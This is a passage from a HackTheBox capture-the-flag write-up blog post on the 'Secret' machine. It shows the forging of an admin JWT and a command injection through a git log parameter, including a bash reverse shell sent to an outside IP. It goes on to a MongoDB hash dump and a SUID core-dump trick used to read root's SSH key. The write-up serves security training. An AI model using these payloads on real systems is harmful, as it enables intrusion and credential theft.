</span></span><span style="display:flex"><span>  <span style="color:#e6db74">&#34;iat&#34;</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1637074738</span>
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>We can change the name field to match <code>theadmin</code>, then encrypt and sign again
using the token we got from the <code>.env</code> file and use it to GET <code>/api/priv</code>. We get
the following response:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="display:flex"><span>{<span style="color:#f92672">&#34;creds&#34;</span>:{<span style="color:#f92672">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;theadmin&#34;</span>,<span style="color:#f92672">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;welcome back admin&#34;</span>}}<span style="color:#960050;background-color:#1e0010">%</span>
</span></span></code></pre></div><p>This means we now have a <em>JWT</em> with admin rights (or at least how it is programmed
haha).</p><h1 id="getting-the-user-flag">Getting the user flag<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-user-flag">#</a></h1><p>After exploring a bit more the code, we can see there is a route <code>/api/logs</code>,
which executes an unescaped git command.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/logs&#39;</span>, <span style="color:#a6e22e">verifytoken</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">file</span>;
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userinfo</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span> }
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userinfo</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">name</span>;
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;theadmin&#39;</span>){
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getLogs</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`git log --oneline </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">file</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span></code></pre></div><p>This means we can do a command injection using the file query parameter.</p><p>In order to try this, we can try to print <code>test</code> to see if it executes.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -G &lt;http://10.10.11.120/api/logs&gt; <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzYzcyMzA4YTI5ZDA0NjI1MjczMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InplYnJhQGV4YW1wbGUuY29tIiwiaWF0IjoxNjM3MDc0NzM4fQ.wGnnkVqhdAph5nRRdqnqbCbHV7jx_eMwh5IgvDSYMTw&#39;</span> <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>--data-urlencode <span style="color:#e6db74">&#34;file=;echo test&#34;</span>
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#e6db74">&#34;80bf34c fixed typos ðŸŽ‰\\n0c75212 now we can view logs from server ðŸ˜ƒ\\nab3e953 Added the codes\\ntest\\n&#34;</span>
</span></span></code></pre></div><p>We get the <code>test</code> message appended to the end. So now we can try to execute a
reverse shell.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>curl -G &lt;http://10.10.11.120/api/logs&gt; <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>-H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkzYzcyMzA4YTI5ZDA0NjI1MjczMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InplYnJhQGV4YW1wbGUuY29tIiwiaWF0IjoxNjM3MDc0NzM4fQ.wGnnkVqhdAph5nRRdqnqbCbHV7jx_eMwh5IgvDSYMTw&#39;</span> <span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex"><span>--data-urlencode <span style="color:#e6db74">&#34;file=;/usr/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.100/6666 0&gt;&amp;1&#39;&#34;</span>
</span></span></code></pre></div><p>And we got into <strong>dasith</strong> user!</p><p>Just for convenience, we can generate a ssh key with <code>ssh-keygen</code> and upload it to
<code>~/.ssh/authorized-keys</code>. And then ssh into the machine with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>ssh -i key_rsa dasith@10.10.11.120
</span></span></code></pre></div><p>This will give us a more useful shell.</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>We saw some <code>mongodb</code> path in the <code>.env</code> file, we can try to get some credentials
from there.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>mongo mongodb://127.0.0.1:27017/auth-web
</span></span></code></pre></div><p>Once connected, we can list the collections with:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>&gt; show collections
</span></span><span style="display:flex"><span>users
</span></span></code></pre></div><p>There is a <code>users</code> collection, lets get the content:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>&gt; db.users.find<span style="color:#f92672">()</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;_id&#34;</span> : ObjectId<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;6131bf09c6c27d0b05c16691&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;name&#34;</span> : <span style="color:#e6db74">&#34;theadmin&#34;</span>, <span style="color:#e6db74">&#34;email&#34;</span> : <span style="color:#e6db74">&#34;admin@admins.com&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span> : <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">a</span>$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6<span style="color:#e6db74">/wqMz2DKjxwQzkModUei&#34;</span>, <span style="color:#e6db74">&#34;date&#34;</span> : ISODate<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;2021-09-03T06:22:01.581Z&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;__v&#34;</span> : <span style="color:#ae81ff">0</span> <span style="color:#f92672">}</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;_id&#34;</span> : ObjectId<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;6131d73387dee30378c66556&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;name&#34;</span> : <span style="color:#e6db74">&#34;newuser&#34;</span>, <span style="color:#e6db74">&#34;email&#34;</span> : <span style="color:#e6db74">&#34;root@dasith.works&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span> : <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">a</span>$10$wnvh2al2ABafCszb9oWi<span style="color:#e6db74">/.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW&#34;</span>, <span style="color:#e6db74">&#34;date&#34;</span> : ISODate<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;2021-09-03T08:05:07.991Z&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;__v&#34;</span> : <span style="color:#ae81ff">0</span> <span style="color:#f92672">}</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;_id&#34;</span> : ObjectId<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;613904ae8a27cb040c65de17&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;name&#34;</span> : <span style="color:#e6db74">&#34;dasith&#34;</span>, <span style="color:#e6db74">&#34;email&#34;</span> : <span style="color:#e6db74">&#34;dasiths2v2@gmail.com&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span> : <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">a</span>$10$S<span style="color:#e6db74">/GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO&#34;</span>, <span style="color:#e6db74">&#34;date&#34;</span> : ISODate<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;2021-09-08T18:45:02.187Z&#34;</span><span style="color:#f92672">)</span>, <span style="color:#e6db74">&#34;__v&#34;</span> : <span style="color:#ae81ff">0</span> <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>I tried decrypting adminâ€™s hash with hashcat resulting in a very long wait
without any success. Meanwile, I tried other privilege escalation techniques,
such as looking for sudo allowed commands with <code>sudo -l</code>, but got no success.
Although, if we look for files with the <strong>setuid</strong> bit flag set:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>find / -type f -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null
</span></span></code></pre></div><p>We get an interesting one: <code>/opt/count</code>. Also, the source code is in the same
folder, in <code>/opt/code.c</code>.</p><p>The executable is owned by root and has the <code>suid</code> bit set, which means it will
run with root privileges until this line:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:flex"><span><span style="color:#75715e">// drop privs to limit file write
</span></span></span><span style="display:flex"><span><span style="color:#75715e"></span><span style="color:#a6e22e">setuid</span>(<span style="color:#a6e22e">getuid</span>());
</span></span></code></pre></div><p>This means all the file and directory reads are performed by root. Although, no
writes can be performed by root (unless executed by root).</p><p>The important part here is the <code>PR_SET_DUMPABLE</code> attribute. According to the man
pages:</p><pre tabindex="0"><code>PR_SET_DUMPABLE (since Linux 2.3.20)
       Set the state of the &#34;dumpable&#34; attribute, which
       determines whether core dumps are produced for the calling
       process upon delivery of a signal whose default behavior
       is to produce a core dump.
</code></pre><p>This means if we send a signal that creates a core dump to the process while
running, a core dump file will be generated. In this core dump we could see the
results of reading some files with privileged access stored in the file buffer,
which will be dumped.</p><blockquote><p>Normally crashes are found in /var/crash, but may also be in /var/spool or
/var/lib/systemd/coredump on other Linux distributions â€“ <a href="https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/#:~:text=The%20default%20path%20where%20core,%2Flib%2Fsystemd%2Fcoredump.">linux-audit.com</a></p></blockquote><p>We can try this by running the <code>count</code> program from one shell and killing it from
another. We donâ€™t have to enter a path, or the executable will try to dump the
file without permissions.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/opt$ ./count
</span></span><span style="display:flex"><span>Enter source file/directory name: /root/root.txt
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Total characters <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
</span></span><span style="display:flex"><span>Total words      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex"><span>Total lines      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex"><span>Save results a file? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>: y
</span></span><span style="display:flex"><span>Path: 
</span></span></code></pre></div><p>Then kill the process with a signal that generates a core dump.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/opt$ ps -aux | grep count
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>root         <span style="color:#ae81ff">854</span>  0.0  0.1 <span style="color:#ae81ff">235668</span>  <span style="color:#ae81ff">7528</span> ?        Ssl  15:16   0:00 /usr/lib/accountsservice/accounts-daemon
</span></span><span style="display:flex"><span>dasith     <span style="color:#ae81ff">40559</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">588</span> pts/0    S+   16:25   0:00 ./count
</span></span><span style="display:flex"><span>dasith     <span style="color:#ae81ff">40699</span>  0.0  0.0   <span style="color:#ae81ff">6432</span>   <span style="color:#ae81ff">660</span> pts/6    S+   16:26   0:00 grep --color<span style="color:#f92672">=</span>auto count
</span></span><span style="display:flex"><span>dasith@secret:/opt$ kill -BUS <span style="color:#ae81ff">40559</span>
</span></span></code></pre></div><p>We can see in the executable shell that the core was dumped. Letâ€™s now look for
the crash report file.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/var/crash$ ls -la
</span></span><span style="display:flex"><span>total <span style="color:#ae81ff">88</span>
</span></span><span style="display:flex"><span>drwxrwxrwt  <span style="color:#ae81ff">2</span> root   root    <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">16</span> 15:22 .
</span></span><span style="display:flex"><span>drwxr-xr-x <span style="color:#ae81ff">14</span> root   root    <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">13</span> 05:12 ..
</span></span><span style="display:flex"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root   root   <span style="color:#ae81ff">27203</span> Oct  <span style="color:#ae81ff">6</span> 18:01 _opt_count.0.crash
</span></span><span style="display:flex"><span>-rw-r-----  <span style="color:#ae81ff">1</span> dasith dasith <span style="color:#ae81ff">28107</span> Nov <span style="color:#ae81ff">16</span> 16:26 _opt_count.1000.crash
</span></span><span style="display:flex"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root   root   <span style="color:#ae81ff">24048</span> Oct  <span style="color:#ae81ff">5</span> 14:24 _opt_countzz.0.crash
</span></span></code></pre></div><p>We will unpack the most recent one (also the created by the user):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/var/crash$ mkdir /tmp/count-crash
</span></span><span style="display:flex"><span>dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/count-crash/
</span></span></code></pre></div><p>We can <code>cat</code> the <code>CoreDump</code> file inside the created folder and find the flag. But as
it is a binary file, it will be easier to use the <code>strings</code> command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/tmp/count-crash$ strings CoreDump
</span></span></code></pre></div><p>This is not a full system own, so we are going to try to read ssh keys. We can
list the <code>.ssh</code> folder files, and we can see there is a <code>id_rsa</code> key.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>dasith@secret:/tmp/count-crash$ /opt/count
</span></span><span style="display:flex"><span>Enter source file/directory name: /root/.ssh
</span></span><span style="display:flex"><span>drwx------      ..
</span></span><span style="display:flex"><span>-rw-------      authorized_keys
</span></span><span style="display:flex"><span>-rw-------      id_rsa
</span></span><span style="display:flex"><span>drwx------      .
</span></span><span style="display:flex"><span>-rw-r--r--      id_rsa.pub
</span></span></code></pre></div><p>After exploiting the crash vulnerability, we are able to retrieve the content of
the <code>id_rsa</code> key. And we can ssh into root to compromise the whole system.</p><h1 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="#references">#</a></h1><ul><li>How to read the core dumps:</li></ul><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://askubuntu.com/questions/304943/how-does-one-get-a-hold-of-the-details-regarding-a-system-application-crash"><div><div class="bookmark-title">How does one get a hold of the details regarding a system/application crash</div><div class="bookmark-description">Is there a way to generate a decent looking report with the /var/share/apport/*.crash files?
If not, how does one get a hold of the details regarding a past system error?</div><div class="bookmark-link"><div>https://askubuntu.com/questions/304943/how-does-one-get-a-hold-of-the-details-regarding-a-system-application-crash</div></div></div><div class="bookmark-image"><img src="https://cdn.sstatic.net/Sites/askubuntu/Img/apple-touch-icon@2.png?v=c492c9229955" alt="" loading="lazy"/></div></a></div><ul><li><code>prctl</code> function and <code>PR_SET_DUMPABLE</code>:</li></ul><div><a target="_blank" rel="noopener noreferrer" class="bookmark" href="https://man7.org/linux/man-pages/man2/prctl.2.html#:~:text=by%20%28int%20*%29%20arg2.-,PR_SET_DUMPABLE,-%28since%20Linux%202.3.20%29"><div><div class="bookmark-title">prctl(2) - Linux manual page</div><div class="bookmark-description"></div><div class="bookmark-link"><div>https://man7.org/linux/man-pages/man2/prctl.2.html#:~:text=by%20(int%20*)%20arg2.-,PR_SET_DUMPABLE,-(since%20Linux%202.3.20)</div></div></div><div class="bookmark-image"></div></a></div></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Secret&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f&amp;title=HackTheBox%20Writeup%3a%20Secret&amp;summary=HackTheBox%20Writeup%3a%20Secret&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f&amp;title=HackTheBox%20Writeup%3a%20Secret"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Secret%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Secret on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Secret&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_secret%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const 